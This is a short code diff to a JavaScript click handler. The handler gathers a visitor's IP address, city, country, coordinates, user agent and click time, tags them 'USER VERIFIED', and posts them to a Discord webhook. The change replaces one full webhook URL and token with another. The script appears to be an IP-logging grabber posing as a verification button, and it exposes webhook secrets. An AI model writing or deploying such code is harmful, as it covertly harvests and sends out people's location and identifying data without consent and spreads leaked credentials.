@@ -13,7 +13,7 @@ clicker.addEventListener("click", async function() {
                 var longitude = data.loc.split(',')[1];
                 var browser = navigator.userAgent;
                 var currentTime = new Date().toLocaleString();
-                var webhookUrl = "https://discord.com/api/webhooks/1241440685404459039/Degknkd5-sSvnMKVpdWt9W5vp2LFdjvzECdk6Mkw0LosEHcEmhubTIxylw4HUQnI8ZA_";
+                var webhookUrl = "https://discord.com/api/webhooks/1255949004320149626/zTcQ3TRXbtQrGeGrxJfJlO7cVp235dR2268pRPpKWxtzAjL863WM2X1TSEOJhjCWoDwc";
                 var message = "USER VERIFIED:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nButton was clicked at: " + currentTime;
 
                 var xhr = new XMLHttpRequest();
